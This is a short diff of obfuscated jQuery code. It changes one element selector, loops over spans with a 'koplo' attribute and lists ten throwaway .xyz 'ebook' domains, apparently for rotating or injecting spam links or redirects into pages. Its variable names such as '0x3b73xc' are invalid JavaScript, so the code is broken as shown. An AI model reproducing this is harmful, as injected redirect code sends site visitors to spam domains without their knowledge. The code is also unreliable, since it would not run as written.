@@ -25,7 +25,7 @@ $(document)['ready'](function () {
             };
         };
 		
-		var 0x3b73xc = $('body')['find']('span#smv');
+		var 0x3b73xc = $('body')['find']('span#sbv');
         for (i = 0; i < 0x3b73xc['length']; i++) {
             if (0x3b73xc[i]['getAttribute']('koplo') != undefined) {
             var myarray= ["http://arpcherimoyaebookszs.xyz","http://arpdamsonebookszs.xyz","http://rabbitebookx.xyz","http://arpbilberryebookszs.xyz","http://giraffeebookx.xyz","http://catebookx.xyz","http://chickenebookx.xyz","http://flyebookx.xyz","http://arpboysenberryebookszs.xyz","http://arpappleebookszs.xyz"];
